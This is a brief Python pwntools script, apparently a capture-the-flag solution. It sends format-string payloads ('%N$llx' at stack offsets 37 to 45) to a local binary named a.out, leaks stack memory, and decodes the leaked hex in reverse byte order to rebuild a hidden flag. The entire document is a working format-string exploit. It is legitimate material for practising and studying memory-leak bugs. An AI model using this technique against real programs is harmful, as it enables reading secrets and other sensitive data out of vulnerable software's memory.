from pwn import *

context.clear(arch='amd64')

flag = ''
for i in range(37, 46):
    print(f'arg: {i}')
    try:
        p = process('./a.out')
        p.recvuntil(b"Tell me a story and then I'll tell you one >> ")
        p.sendline(f'%{i}$llx'.encode())
        p.readline()
        d = p.recvline().strip()
        flag += bytearray.fromhex(d.decode()).decode()[::-1]
  
    except Exception as e:
        pass

print(flag)
# clean up resulting flag
